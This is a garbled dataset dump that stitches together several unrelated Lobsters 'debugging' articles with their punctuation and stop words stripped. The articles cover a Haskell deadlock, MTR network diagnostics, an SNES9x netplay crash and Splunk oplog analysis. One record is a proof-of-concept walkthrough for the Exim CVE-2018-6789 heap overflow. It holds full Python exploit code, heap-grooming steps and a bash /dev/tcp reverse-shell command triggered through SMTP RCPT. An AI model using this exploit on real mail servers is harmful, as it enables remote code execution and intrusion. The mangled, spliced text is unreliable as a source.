situation though know thread nt blocking short period time wrap around haslocked function timeout import systemtimeout haslockedtimely int string io io haslockedtimely n msg action timeout n haslocked msg action maybe saystring timeout msg throwio deadlock return time wrap around actual action picking fork pickupforks int mvar mvar io pickupforks num let mkmsg fork mkmsg num deadlocked picking fork haslockedtimely mkmsg left fork takemvar threaddelay haslockedtimely mkmsg right fork takemvar sure enough know exact place program deadlocked philosopher philosopher thinking philosopher thinking philosopher thinking philosopher thinking philosopher thinking timeout philosopher deadlocked picking right fork philosopher thread run infinite loop deadlock timeout philosopher deadlocked picking right fork timeout philosopher deadlocked picking right fork timeout philosopher deadlocked picking right fork philosopher thread run infinite loop deadlock timeout philosopher deadlocked picking right fork philosopher thread run infinite loop deadlock philosopher thread run infinite loop deadlock philosopher thread run infinite loop deadlock c verify trick nt interfere correct functionality apply dijkstra solution philosopher int int mvar int mvar io philosopher num leftnum forkleft rightnum forkright dine dine saystring mkmsg num thinking leftnum rightnum pickupforks num forkleft forkright else pickupforks num forkright forkleft saystring mkmsg num eating threaddelay putdownforks forkleft forkright dine dining philosopher happily enjoy spaghetti eternity philosopher philosopher thinking philosopher thinking philosopher thinking philosopher thinking philosopher thinking philosopher eating philosopher thinking philosopher eating philosopher thinking philosopher eating philosopher eating philosopher thinking philosopher eating philosopher thinking philosopher eating philosopher thinking philosopher thinking philosopher eating philosopher thinking never stop improvement technique say ever become part library would useful utilize templatehaskell order report exact location code automatically instead inferring custom message alternatively could use hascallstack sound like much better approach may even something could get added ghc without significant breaking compatibility conclusion sum need banging head table deadlock code bit effort rely ghc point u naturally one many problem get way writing concurrent program despite technique proved pretty reliable ca nt point logic error tell u exact reason program reached deadlock experienced software engineer tackle problem like pleasure feel free reach u haskell programming matter easy hard project might also find helpful reading material haskell syllabus well another blog post related topic async exception stm deadlock like blog post need help devops rust functional programming contact u share
313,Lobsters,debugging,Debugging,Diagnosing Network Issues with MTR,https://www.linode.com/docs/networking/diagnostics/diagnosing-network-issues-with-mtr/,diagnosing network issue mtr,diagnosing network issue mtr mtr network diagnostics system diagnostics network diagnostics background install mtr linux debianubuntu centosrhelfedora window winmtr upstream macos homebrew macports generate mtr report source host destination host use mtr unixbased system whatismyipcom note use mtr window system read mtr report hop analyze mtr report verify packet loss email protected email protected network latency email protected email protected common mtr report destination host networking improperly configured email protected residential business router isp router configured properly email protected email protected icmp rate limiting email protected timeouts email protected advanced mtr technique mode used resolve routing networking issue identified mtr report information cc bynd,diagnosing network issue mtr updated thursday june linode written brett kaplan mtr powerful tool enables administrator diagnose isolate networking error provide report network status upstream provider mtr represents evolution traceroute command providing greater data sample augmenting traceroute ping output document provides indepth overview mtr data generates interpret draw conclusion based data provided basic overview network diagnostic technique see introduction network diagnostics general issue system read overview general system diagnostics network diagnostics background networking diagnostic tool including ping traceroute mtr use internet control message protocol icmp packet test contention traffic two point internet user ping host internet series icmp packet sent host turn responds sending reply packet user client able compute round trip time two point internet contrast tool traceroute mtr send icmp packet incrementally increasing ttls order view route series hop packet make origin destination ttl time live control many hop packet make dying returning host sending series packet causing return one hop two three mtr able assemble route traffic take host internet rather provide simple outline route traffic take across internet mtr collect additional information regarding state connection responsiveness intermediate host additional information mtr provide complete overview connection two host internet following section outline install mtr software interpret result provided tool install mtr linux debianubuntu apt update apt upgrade apt install mtrtiny centosrhelfedora yum update yum install mtr window window port mtr called winmtr download application winmtr upstream macos install mtr macos either homebrew macports install mtr homebrew run brew install mtr install mtr macports run port install mtr generate mtr report mtr provides image route traffic take one host another essentially directional tool route taken two point internet vary great deal based location router located upstream reason good idea collect mtr report direction host experiencing connectivity issue linode customer support often request mtr report linode experiencing networking issue time time mtr report detect error one direction still packet loss opposite direction referring mtr report document refers host running mtr source host host targeted query destination host use mtr unixbased system generate mtr report using following syntax mtr rw destinationhost example test route connection quality traffic destination host examplecom mtr rw examplecom mtr report linode run local computer replace ip address linode mtr rw ssh linode collect mtr report linode home network replace ip address home network mtr rw know home ip address use whatismyipcom packet loss detected support technician may ask run faster interval mtr rwc rw system using flag may require administrative privilege sudo mtr rwc rw note r option flag generates report short report w option flag us longversion hostname technician see full hostname hop short reportwide c option flag set many packet sent recorded report used default generally faster interval may want set report take longer finish use mtr window system running mtr window us gui open winmtr type destination host box prompted select start option begin generating report data need use linux version mtr shown generate mtr report linode read mtr report mtr report contain great deal information difficult interpret first following example report local connection googlecom mtr report googlecom host example loss snt last avg best wrst stdev innercake outercake report generated mtr report googlecom us report option sends packet host googlecom generates report without report option mtr run continuously interactive environment interactive mode reflects current round trip time host case report mode provides sufficient data useful format numbered line report represents hop hop internet node packet pas get destination name host eg innercake outercake example determined reverse dns lookup want omit rdns lookup use nodns option produce output similar following mtr nodns report googlecom host deleuze loss snt last avg best wrst stdev beyond simply seeing path server packet take reach host mtr provides valuable statistic regarding durability connection seven column follow loss column show percentage packet loss hop snt column count number packet sent report option send packet unless specified reportcycles numberofpackets numberofpackets represents total number packet want send remote host next four column last avg best wrst measurement latency millisecond eg m last latency last packet sent avg average latency packet best wrst display best shortest worst longest round trip time packet host case average avg column focus attention final column stdev provides standard deviation latency host higher standard deviation greater difference measurement latency standard deviation allows ass mean average provided represents true center data set skewed sort phenomenon measurement error standard deviation high latency measurement inconsistent averaging latency packet sent average look normal may fact represent data well standard deviation high take look best worst latency measurement make sure average good representation actual latency result much fluctuation circumstance may think mtr output three major section depending configuration first hop often represent source host isp last hop represent destination host isp hop router packet traverse reach destination example mtr run home pc linode first hop belong isp last hop belong data center linode resides hop middle intermediate hop running mtr locally see abnormality first hop near source contact local service provider investigate local networking configuration conversely see abnormality near destination may want contact operator destination server network support machine unfortunately case problem intermediate hop service provider limited ability address issue analyze mtr report verify packet loss analyzing mtr output looking two thing loss latency see percentage loss particular hop may indication problem particular router however common practice among service provider rate limit icmp traffic mtr us give illusion packet loss fact loss determine loss seeing real due rate limiting take look subsequent hop hop show loss likely seeing icmp rate limiting actual loss email protected mtr report wwwgooglecom host example loss snt last avg best wrst stdev case loss reported hop likely due rate limiting second hop although traffic remaining eight hop touch second hop packet loss loss continues one hop possible packet loss routing issue remember rate limiting loss happen concurrently case take lowest percentage loss sequence actual loss email protected mtr report wwwgooglecom host localhost loss snt last avg best wrst stdev case loss hop well hop assume third fourth hop likely losing amount traffic subsequent host report zero loss however loss due rate limiting several final hop experiencing loss different amount loss reported always trust report later hop loss also explained problem return route packet reach destination without error hard time making return trip reason often best collect mtr report direction experiencing issue resist temptation investigate report incidence packet loss connection internet protocol designed resilient network degradation route data take across internet fluctuate response load brief maintenance event routing issue mtr report show small amount loss neighborhood cause real concern application layer compensate loss likely transient network latency addition helping ass packet loss mtr also help ass latency connection host target host virtue physical constraint latency always increase number hop route however increase consistent linear unfortunately latency often relative dependent quality host connection physical distance evaluating mtr report potentially problematic connection consider earlier fully functional report context addition known connection speed host given area connection quality may also affect amount latency experience particular route predictably dialup connection much higher latency cable modem connection destination following mtr report show high latency email protected mtr report wwwgooglecom host localhost loss snt last avg best wrst stdev amount latency jump significantly hop remains high may point network latency issue round trip time remain high fourth hop report impossible determine cause although saturated peering session poorly configured router congested link frequent cause unfortunately high latency always mean problem current route report like one mean despite sort issue hop traffic still reaching destination host returning source host latency could caused problem return route well return route seen mtr report packet take completely different route particular destination example large jump latency host latency increase unusually subsequent hop logical assume issue router icmp rate limiting also create appearance latency similar way create appearance packet loss email protected mtr report wwwgooglecom host localhost loss snt last avg best wrst stdev first glance latency hop draw attention however fifth hop latency drop drastically actual latency measured case like mtr draw attention issue affect service consider latency final hop evaluating mtr report common mtr report networking issue novel require escalation operator upstream network however number common mtr report describe common networking issue experiencing sort networking issue want diagnose problem consider following example destination host networking improperly configured next example appears loss destination host incorrectly configured router first glance appears packet reaching host case email protected mtr report wwwgooglecom host localhost loss snt last avg best wrst stdev traffic reach destination host however mtr report show loss destination host sending reply may result improperly configured networking firewall iptables rule cause host drop icmp packet way tell loss due misconfigured host look hop show loss previous report see final hop mtr try additional hop difficult isolate issue without baseline measurement kind error quite common residential business router residential gateway sometimes cause misleading report mtr nodns report googlecom host deleuze loss snt last avg best wrst stdev loss reported second hop indicate problem see loss subsequent hop isp router configured properly sometimes router route packet take incorrectly configured packet may never reach destination email protected mtr report wwwgooglecom host localhost loss snt last avg best wrst stdev question mark appear additional route information sometimes poorly configured router send packet loop see following example email protected mtr report wwwgooglecom host localhost loss snt last avg best wrst stdev report show router hop properly configured situation occur way resolve issue contact network administrator team operator source host icmp rate limiting icmp rate limiting cause apparent packet loss packet loss one hop persist subsequent hop loss caused icmp limiting see following example email protected mtr report wwwgooglecom host localhost loss snt last avg best wrst stdev report show cause concern rate limiting common practice reduces congestion prioritize important traffic timeouts timeouts happen various reason router discard icmp absent reply shown output timeouts alternatively may problem return route email protected mtr report wwwgooglecom host localhost loss snt last avg best wrst stdev timeouts necessarily indication packet loss packet still reach destination without significant packet loss latency timeouts may attributable router dropping packet qos quality service purpose may issue return route causing timeouts another false positive advanced mtr technique newer version mtr capable running tcp mode specified tcp port compared default use icmp ping protocol however case mode used tcp report misleading diagnosing interroute issue tcp mtr use syn packet place icmp ping internetlevel router respond erroneously indicating loss tcp test useful determining whether firewall rule router somewhere blocking protocol port perhaps port forwarding configured properly running tcp test certain port could clearly reveal whereas icmp test may running mtr tcp mode require superuser privilege machine sudo mtr tcp port report reportcycles speedtestdallaslinodecom sudo mtr tcp port report reportcycles resolve routing networking issue identified mtr report majority routing issue displayed mtr report temporary issue clear within hour case time able notice problem route internet service provider monitoring already reported problem administrator working fix issue case experiencing degraded service extended period time may choose alert provider issue experiencing contacting service provider send mtr report relevant data may without usable data provider way verify fix problem routing error issue account percentage networkrelated slowness mean cause degraded performance network congestion particularly long distance peak time become severe transatlantic transpacific traffic quite variable subject general network congestion case recommended position host resource geographically close targeted audience possible experiencing connectivity issue unable interpret mtr report open support ticket include output report support tab linode manager technician help analyze issue information may wish consult following resource additional information topic provided hope useful please note vouch accuracy timeliness externally hosted material guide published cc bynd license
315,Lobsters,debugging,Debugging,My PoC walk through for CVE-2018–6789,https://medium.com/@straightblast426/my-poc-walk-through-for-cve-2018-6789-2e402e4ff588,poc walk,poc walk ustrlen code g b c nc localhost ehlo testexamplecom auth plain qufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqq b c size yieldlength storepool nc localhost ehlo testexamplecom auth plain qufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqqx size yieldlength storepool create free chunk block size free item unsorted bin cut block ehlo ehlo b unrec xff ehlo trigger bug size free size used size free v c encode vencode replace n replace write auth plain encode x readuntil data finding last two byte last byte x e f g h p v c encode vencode replace n replace encode encode pe write auth plain encode readuntil data len data clear return first round patching fakeheader p fakeheader p v e fakeheader e fakeheader encode vencode replace n replace write auth plain encode readuntil data free extended chunk ehlo f storefree senderheloname overlap block round patching size free size used unrec xff unrec xff fakeheader p fakeheader p authplain g fakeheader g fakeheader allocate extended chunk free acl store block print aclsmtprcpt uschar aclcheckrcpt address authplain h p p address p h ehlo b filename linenumber print b storeblock overwrite aclcheckrcpt aclsmtprcptoffset localhost localport cmd binbash c binbash devtcp localhost str localport cmdexpansionstring run cmd authplain j aclsmtprcptoffset cmdexpansionstring j aclsmtprcptoffset len cmdexpansionstring run binbash c binbash shell time write mail test pwnedcom print readuntil ok write rcpt shell pwnedcom print readuntil ok process executing new program binbash exploitation demo poc exploit code straightblast gmailcom test pwnedcom shell pwnedcom useful breakpoints b b b b newblock next null b filename linenumber storefree senderheloname return yield reference http,poc walk straightblast gmailcomintroductionon march security researcher named meh referred author published blog post vulnerability identified exim gave detailed explanation exploit vulnerability however proof concept code release decided develop poc based strategy blog walk proof concept code proceeding reading post mandatory reader read understand author blog post excellent job describing exim heap management exploitation strategy reader expected understanding heap exploitation encouraged read author listed referencesthe vulnerabilityas highlighted author offbyone calculation mistake decoded buffer length function uschar code uschar ptr int x uschar result storeget ustrlen code ptr result rest decoding algorithm invalid encoded string length allocate buffer size consume byte decoding allows heap memory overwritten parsing stringsetupi setup test environment using dockerdocker pull debiandocker run name exim capaddsysptrace securityopt seccompunconfined p debiandocker exec exim binbashinstalled necessary library tool usingaptget updateaptget install gcc nettools vim gdb python wget git make procps libdbdev libxtdev user exim processadduser eximdemodownload exim github repositorygit clone b singlebranch git githubcomeximeximi following build eximcd tmpeximsrccp srceditme localmakefilecp eximmonitoreditme localeximonconfmodify line eximsrclocalmakefile include eximusereximusereximdemoenable plain text authenticator uncommentingauthplaintextyesedit eximsrcosmakefilelinux change followingcflags dlargefilesourcetocflags g dlargefilesourcethis enables symbol debugging purposesrun make install eximsrc folder installed binary located usreximbin folderenable auth exim editing usreximconfigure find begin authenticator section make following changesplain driver plaintextpublicname plainservercondition eq username eq mysecret serversetid serverprompts servercondition authentication yet configured serveradvertisecondition def tlsincipher run exim daemonusreximbinexim bd gdb attach eximgdb p p aux grep exim awk print observing vulnerabilityattach debugger exim set breakpoint functionpwndbg b file line ccontinuingsend encoded string composing character auth plain commandnc localhost esmtp exim wed apr hello testexamplecom helpauth plain qufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqqwhen function get breakpoint hit set new breakpoint functionpwndbg b file storec line ccontinuingstep line print size variablepwndbg snipped nt room current block get new one size storeblocksize would expect norm function mostly called small amount store size yieldlength storepool int length size storeblocksize storeblocksize size int mlength length alignedsizeofstoreblock storeblock newblock null snipped f print size debugger output indicates size byte space required store decoded stringthe space hold decoded string agreement size procedure include one character stringnc localhost esmtp exim wed apr hello testexamplecom helpauth plain qufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqufbqqxthe size variable calculated snipped nt room current block get new one size storeblocksize would expect norm function mostly called small amount store size yieldlength storepool int length size storeblocksize storeblocksize size int mlength length alignedsizeofstoreblock storeblock newblock null snipped f print size space hold decoded string consists character one expecting sizepwndbg free chunk blocksend ehlo command hostname ascii character put freed size chunk unsorted binecho python c print ehlo nc localhost address content senderheloname pwndbg ehlo command performs series memory allocation deallocation ended following heap size used stringcopymalloc size free item unsorted bin size used malloc size used malloc chunk item unsorted binpwndbg unsortedbinunsortedbinall size blocksthe author suggested cut free chunk followit took step get desire send ehlo command hostname ascii character get free chunk unsorted send ehlo command hostname ascii character free space occupied char hostname ehlo use free chunk space small bin store new char hostnamethe free block discovered small binpwndbg send unrecognized command character carve size chunk merged free chunk size send ehlo command hostname ascii character carve size chunk merged free chunk size ehlo command free hostname ehlo command along previous allocated store block includes storage unrecognized command poc far usrbinpythonimport timeimport socketimport structs nonef nonedef connect host port global global f socketcreateconnection host port f smakefile rw def p v return structpack q v def readuntil delimn data dataendswith delim data fread return datadef write data fwrite data n def ehlo v write ehlo v print readuntil help def unrec v write v print readuntil command def exploit connect localhost timesleep ehlo ehlo b unrec xff ehlo name main exploit heap desired state according debuggerpwndbg previnuse prevsize size fd bk fdnextsize bknextsize prevsize size fd bk fdnextsize bknextsize previnuse prevsize size fd bk fdnextsize bknextsize trigger bugthe heap layout size free item unsorted bin size used ehlo hostname size free item unsorted bin size size used size free item unsorted bin size used size free item large bin size size used size free item unsorted bin size used size top chunkthe author next strategy allocate chunk though plain auth command one byte overrun ehlo command hostnamei allocated free chunk ehlo hostname sending auth plain command character string string also overwrite least significant byte heap size value ehlo hostname chunkrevised code exploit methoddef exploit connect localhost timesleep ehlo ehlo b unrec xff ehlo v c encode vencode replace n replace write auth plain encode x readuntil data sending x last character encoded string overwrites following chunk metadata size value author strategy overwrite one byte extend chunk size reviewed exim implemented decode algorithm learned last two byte encoded string determines last byte decoded stringi traced code expression evaluates last decoded character line result x expression us variable variable x identify sourcethe variable hold last character encoded string variable x hold last character encoded stringthe x variable go table lookup evaluated line implement table lookup variable isspace code debugprintf cn return line implement table lookup variable x x x x return uschar following identify last two character needed decode create like one remove entry value decode algorithm return identifies mapped value return table compute possible value x newtablex x table newtablexappend x newtabley table newtableyappend print newtablex print newtabley brute force entry newtablex newtabley xy evaluates value end x newtablex newtabley x str hex len print x ti got output select use x find x x find x since computed newtablex table print newtablex though manual inspection index contains value newtablex corresponding index table return value inspecting index return value ascii character e f g procedure applied find original value table print newtabley identified index return value newtabley return value table ascii value p original valuerevised code exploit methoddef exploit connect localhost timesleep ehlo ehlo b unrec xff ehlo v c encode vencode replace n replace encode encode pe write auth plain encode readuntil data inspecting memory agrees merun till exit authplaintextserver len data clear return value returned snipped source code authvars expandnstring expandnmax u expandnlength expandnmax else len data clear return end clear len clear end expandnmax expandmaxn expandnmax authvars authvars expandnmax clear expandnstring expandnmax clear snipped f f f f f f f round patchingin order free extended chunk size allocate block fake heap header data fake chunk extended address start fake chunkrevised code exploit methoddef exploit connect localhost timesleep ehlo ehlo b unrec xff ehlo v c encode vencode replace n replace encode encode pe write auth plain encode readuntil data fakeheader p fakeheader p v e fakeheader e fakeheader encode vencode replace n replace write auth plain encode readuntil data take decoded character fit chunk block difference prefix decoded value charactersi create fake heap meta data prevsize size difference suffix string fillersexamining memory agreement want achievepwndbg extended chunki free extended chunk using ehlo command small hostnamerevised code exploit methoddef exploit connect localhost timesleep ehlo ehlo b unrec xff ehlo v c encode vencode replace n replace encode encode pe write auth plain encode readuntil data fakeheader p fakeheader p v e fakeheader e fakeheader encode vencode replace n replace write auth plain encode readuntil data ehlo f debugger output freeing ehlo hostname aka extended chunk discard previous helo name senderheloname null storefree senderheloname senderheloname null skip test junk permitted f f f f f f print senderheloname uschar repeat time pwndbg unsorted bin indicates extended chunk first item listpwndbg unsortedbinunsortedbinall block round patchingthe ehlo go series allocation deallocation put memory size free size used size size size size free size size free size size size size top chunkthe unsorted bin listunsortedbinall observed following heap extended chunk address longer identified individual chunk merged chunk creating free block size fake chunk created address carved legit chunk address longer identified individual chunk however noted free chunk unsorted bin size allocate chunk address overlap freeing extended chunkthe unsorted bin freeing extended chunkunsortedbinall order allocate extended super chunk address allocate first three item unsorted bin list one item chunk address partially overlap chunk address ensure heap metadata chunk valid else unable allocate super chunk therefore include heap metadata input allocation patch header chunk first third item unsorted bin use two unrecognized command filler upfor second item use auth plain command usrbinpythonimport timeimport socketimport structs nonef nonedef connect host port global global f socketcreateconnection host port f smakefile rw def p v return structpack q v def readuntil delimn data dataendswith delim data fread return datadef write data fwrite data n def ehlo v write ehlo v print readuntil help def unrec v write v print readuntil command def authplain v encode vencode replace n replace write auth plain encode print readuntil data def onebyteoverwrite v c encode vencode replace n replace encode encode pe write auth plain encode print readuntil data def exploit connect localhost timesleep ehlo ehlo b unrec xff ehlo onebyteoverwrite fakeheader p fakeheader p authplain e fakeheader e fakeheader ehlo f unrec xff unrec xff fakeheader p fakeheader p authplain g fakeheader g fakeheader name main exploit heap metadata chunk address patchedpwndbg auth plain command make additional allocation expanding string happens allocate block super extended chunk address leaf free block size extended free chunk first item unsorted bin listpwndbg unsortedbinunsortedbinall extended chunk free acl store blockthe extended chunk address overlap debugger confirmed overlapping truethe author suggested allocate extended chunk overwrite next pointer chunk next pointer reference store block contains aclthe start user control data store block offset start allocated chunk actual starting point control extended chunk address offset position next pointer identify available acl stringspwndbg print aclsmtpauth uschar print aclsmtpdata uschar aclcheckdata pwndbg print aclsmtpetrn uschar print aclsmtpexpn uschar print aclsmtphelo uschar print aclsmtpmail uschar print aclsmtpquit uschar print aclsmtprcpt uschar aclcheckrcpt identify store block acl string belongs manual fastbin prevsize size fd bk fdnextsize bknextsize previnuse prevsize size fd bk fdnextsize bknextsize previnuse prevsize size fd bk fdnextsize bknextsize pwndbg printf dn starting address acl store block control user input start offset acl store block header start value want overwrite next pointer withlastly send another ehlo command small hostname force previous store block reset free free acl store block allocate laterrevised code exploit methoddef exploit connect localhost timesleep ehlo ehlo b unrec xff ehlo onebyteoverwrite fakeheader p fakeheader p authplain e fakeheader e fakeheader ehlo f unrec xff unrec xff fakeheader p fakeheader p authplain g fakeheader g fakeheader address authplain h p p address p h ehlo next pointer successfully overwrittenpwndbg acl store block get snipped bb bb next poolmalloc b length alignedsizeofstoreblock b filename linenumber cut debugging stuff utility stop picky compiler giving warning snipped f f f f f f f print b storeblock noted author suggested perform partial overwrite next pointer implement code perform partial overwrite left exercise readeroverwrite aclcheckrcpt overwrite aclcheckrcpt standard bash reverse shell commandbash devtcp ipaddress port code exploit methoddef exploit connect localhost timesleep ehlo ehlo b unrec xff ehlo onebyteoverwrite fakeheader p fakeheader p authplain e fakeheader e fakeheader ehlo f unrec xff unrec xff fakeheader p fakeheader p authplain g fakeheader g fakeheader address authplain h p p address p h ehlo aclsmtprcptoffset localhost localport cmd binbash c binbash devtcp localhost str localport cmdexpansionstring run cmd authplain j aclsmtprcptoffset cmdexpansionstring j aclsmtprcptoffset len cmdexpansionstring successfully overwritten content aclsmtprcpt pwndbg x run binbash pwndbg printf aclsmtprcpt run binbash c binbash shell timethe content aclsmtprcpt get evaluated send rcpt command perquisite rcpt command send mail command firstrevised code exploit methoddef exploit connect localhost timesleep ehlo ehlo b unrec xff ehlo onebyteoverwrite fakeheader p fakeheader p authplain e fakeheader e fakeheader ehlo f unrec xff unrec xff fakeheader p fakeheader p authplain g fakeheader g fakeheader address authplain h p p address p h ehlo aclsmtprcptoffset localhost localport cmd binbash c binbash devtcp localhost str localport cmdexpansionstring run cmd authplain j aclsmtprcptoffset cmdexpansionstring j aclsmtprcptoffset len cmdexpansionstring write mail test pwnedcom print readuntil ok write rcpt shell pwnedcom print readuntil ok pwndbg ccontinuing new process thread debugging using libthreaddb enabled using host libthreaddb library new process thread debugging using libthreaddb enabled using host libthreaddb library process executing new program binbash new process inferior process exited code exploitation demopoc exploit code usrbinpythonimport timeimport socketimport structs nonef nonedef logo print print poc exploit print straightblast gmailcom printdef connect host port global global f socketcreateconnection host port f smakefile rw def p v return structpack q v def readuntil delimn data dataendswith delim data fread return datadef write data fwrite data n def ehlo v write ehlo v readuntil help def unrec v write v readuntil command def authplain v encode vencode replace n replace write auth plain encode readuntil data def onebyteoverwrite v c encode vencode replace n replace encode encode pe write auth plain encode readuntil data def exploit logo connect localhost print connected target timesleep ehlo ehlo b print created free chunk size unsorted bin unrec xff ehlo onebyteoverwrite print triggered byte overwrite extend target chunk size fakeheader p fakeheader p authplain e fakeheader e fakeheader print patched chunk fake header extended chunk freed ehlo f print freed extended chunk unrec xff unrec xff print occupied item unsorted bin filler fakeheader p fakeheader p authplain g fakeheader g fakeheader print patched chunk fake header extended chunk allocated address authplain h p p address p h print overwrite next pointer acl store block address ehlo print freed acl store block aclsmtprcptoffset localhost localport cmd binbash c binbash devtcp localhost str localport cmdexpansionstring run cmd authplain j aclsmtprcptoffset cmdexpansionstring j aclsmtprcptoffset len cmdexpansionstring print malloced acl store block overwrite content aclsmtprcpt shell expression write mail test pwnedcom readuntil ok write rcpt shell pwnedcom print triggered rcpt executing shell expression enjoy shell printif name main exploit useful breakpointspwndbg b file storec line commandtype command breakpoint one per lineend line saying end print newblock endpwndbg pwndbg b file storec line commandtype command breakpoint one per lineend line saying end print b endpwndbg pwndbg b file smtpinc line commandtype command breakpoint one per lineend line saying end print senderheloname endpwndbg pwndbg b file smtpinc line commandtype command breakpoint one per lineend line saying end print senderheloname endbreakpoint observe storemalloc call newblock poolmalloc mlength used pool nonpoolmalloc mlength exclude overall total newblock storemalloc mlength newblock next null newblock length length chainbase storepool chainbase storepool newblock else currentblock storepool next newblock breakpoint observe call filename linenumber endif bb bb next poolmalloc b length alignedsizeofstoreblock b filename linenumber breakpoint observe storefree call checkehlo discard previous helo name senderheloname null storefree senderheloname senderheloname null observe stringcopymalloc call checkehlo save argument ok yield senderheloname stringcopymalloc start return yield reference http
317,Lobsters,debugging,Debugging,SNES9x Netplay Crash,http://gekk.info/articles/snes9x.html,netplay crash,debugging netplay crash tree radius two bit article gekkinfo list article,debugging netplay crash spent last day troubleshooting bug requires backstory anticipated question even using emulator much better began silly idea twitch stream would get four friend together vein twitch play pokemon would control videogame unlike event however everyone would direct control player every rand second control would switch random different player knew zsnes could nt one netplay participant control given virtual gamepad input time seemed show limitation however tested friend appeared work manage gameshow wrote terrible python script quickly dirtily possible simply slept random second chose random wav list played really filthy script open two audio device default window one vbaudio virtual cable first twitch stream could hear second mixed mic audio directed discord input contestant would get near realtime surprisingly script work fine despite worst code written since teenager stream total failure turn misunderstood seeing tested player actually gamepad player consecutive pad damnit tried couple emulator success gave project ended stream intent making happen got cracking source code started zsnes gave really fast hacking zsnes suck window next got source found readily compiled visual studio readily mean spent four hour fighting figured needed clean wipe reinstall visual studio select window xp window compatibility library right away binary source terrible readable well laid source file nonsense name servercpp contains server code client code netplaycpp use function prefix np netplay never know anything comment seen five total implementing manyplayersononegamepad hack fun detail later actually forefront mind though something odd happened stream poor girlfriend excluded fun even found emulator would nt wanted attempted join everyones emulator threw error disconnected tried several order operation found happened reliably fifth player joined matter really bugged got gamepad hack working thought set trying solve crash first regale detail titillate mind especially nt network programmer writing layer network protocol procedure take three shot whiskey finish writing get binary calculator got ta get everything perfect say http work done writing soap whatever past layer writing layer everything unlimited length string protocol right top tcp however purpose built low latency game application worked c program protocol first problem overcome nt know done getting input ethernet ip concept packet tcp recv method requires specify many byte expecting many pop buffer incoming tcp data know much recv without already recvd answer bootstrap begin server send amount data absolutely known size protocol might send four byte line represent length data client establishes socket read four byte stop decodes read number byte specified first four byte read much data look another header size order proceed critical exactly come pipe next bytestream protocol like depends absolute guarantee server always send data precisely right order never stop middle data switch gear send something else tag everything accurate header called framing expert stuff assume sophisticated application method recovering framing become lost overall run dead reckoning initial failure mode would start game server connect three client server mode host open session quake style total four client worked perfectly would connect fourth client five connection including host following would happen host window would disappear four window would report bad magic number server heart beat professional programmer coding since twelve decent amount expertise narrowing problem figured protocol error crashing end server simple local bug like unhandled exception causing crash client would nt report error would hang indefinite amount time socket would time shut connection maybe crash point possible server could sent malformed packet due memory corruption exited corruption caught shortly afterwards unlikely presumption server working correctly sending data client could nt understand fact server closing unusual error well soon ran server debugger attached visual studio notified heap corruption unhandled exception stack cookie instrumentation code detected stackbased buffer overrun occurred stared server code realized underallocated buffer easy fix applied server nt crash anymore client still throwing bad magic number turned around attached debugger client exception client whatever issue handled otherwise would nt getting popup started adding breakpoints singlestepping stunned patient process server let client sit responding tcp minute singlestepped code actually really cool debug like found problem server protocol code mind protocol documentation reverse engineer protocol custom wireshark nt ton help generic tcp packet data set breakpoint receive data routine stepped packet came time packet received copied buffer content text file stepped client code see code path followed packet labeled one turn understood connect sync procedure tcp handshake initial conversation go server sends one packet instructing client load rom server sends one packet containing sram dump game server sends one packet telling client reset game server begin sending joypad update client begin sending joypad update packet begin header structure consisting magic number opcode telling client rest data unique opcode see first three packet begin fourth cause error begin note dump raw output recv routine client put buffer first second third fourth time tried read one complete server instruction tcp stream sent wire matching packet wireshark really tough gave stared dump bit learned elsewhere source status joypad packed byte believe bit representing state left right b x l r select start think little mouse light gun etc joypad update packet length byte joypad use npmaxclients constant set source representing max player supported length data eight possible joypads byte banging head eight hour finally put nose grindstone figured relate packet wireshark getting app realized may well looked hard picture fourth packet show two pattern followed exactly see last packet contains proper header also noticed packet wireshark changed size added player tell u something critical server sending much joypad data client client reading header value find long packet supposed many byte take tcp stream visited probably singlestepped code time finally staring code swear god know story dude ran tree desert tree radius one literally three four comment entirety netplaycpp idea parse earlier nt know opcode sat packet ignoring came back realized figured stared little longer suddenly saw problem might already see joypad data count top two bit top two bit two bit store maximum four unique value meaning five player overflow wrap around nt allot enough room protocol format four player worth joypad data packet ca nt hold length field header short looked packet killing client inexplicably joypad data instead header reading one joypad worth data first packet thinking done looking new packet grabbing rest first packet instead kicker ca nt practically fixed way completely rewrite protocol work entire codebase joypad update might used lot place ton regression testing nt willing nt time energy c skill could also done something like extended length server reset packet packed client count know easier hardcoded end server always sends structs client always decodes care done christ almighty work mean packet full useless data le player playing nt need save byte packet fine guess want moral story never assume person reasonable job could gaping hole logic nothing precludes nt let believe assumption like protocol welldefined fundamentally work case protocol deeply flawed contact article gekkinfo would love hear input story disagreement etc list article
318,Lobsters,debugging,Debugging,Visualizing the Oplog with Splunk,http://www.petecorey.com/blog/2018/04/30/visualizing-the-oplog-with-splunk/,visualizing oplog splunk,splunk oplog event studio fork bomb issue,recently found investigating mysterious occurrence production meteor application seemingly randomly without obvious connection user activity periodic job activity meteor server would spike one hundred precent cpu consumption stay pegged restarted investigating nearly every hunch could come left course action final theory massive influx mongodb operation flooding database concerned observer listening within meteor application would overwhelmed trying catch change consume available cpu cycle server order test theory wanted plot mongodb oplog time series chart compare timeline known cpu spike looking correlation many option approach problem decided use splunk visualize explore oplog data happy splunk performed see using interested oplog event happened twentyfour hour period surrounding known cpu spike utc april fired studio ran following query oplogrs collection mongodb database db oplogrs find t gte new timestamp t lte new timestamp query returned seven hundred fifty thousand result able export json file using studio studio mongodb client found support saving entire set query result file seven hundred fifty thousand oplog event exported disk able upload directly splunk index splunk gracefully parsed json data flattened object neatly searchable collection data available splunk free start exploring first step plot time chart oplog event given large amount data working decided bin event five minute band index oplog timechart count overview data interestingly obvious dip oplog event occurred around time observed cpu spike exact opposite expected see given working hypothesis zooming dip investigating decided plot time series every type oplog event based op field index oplog timechart count op improve clarity also focused narrower time range reduced bin size switched log scale axis everything working intended new chart show insert update u operation completely stop dip noop n operation continue usual seemed indicate database healthy meteor application stopped making insert update request make sense server eating available cpu cycle probably find time query database visualizing oplog event around several cpu spike became painfully obvious working hypothesis correct influx database operation prior spike dip database activity easily attributable server restarts back square one nothing absolutely investigating problem proving something cause problem incredibly valuable repeatedly narrowing possible set culprit simplify problem mind make real cause much easier find spending time digging issue convinced related fork bomb crippling server discussed issue filed meteor project said exploration proved incredibly valuable proving obverserver overload cause spike able rule huge swatch potential fix also able spend time trying fantastic new tool sure find using splunk future
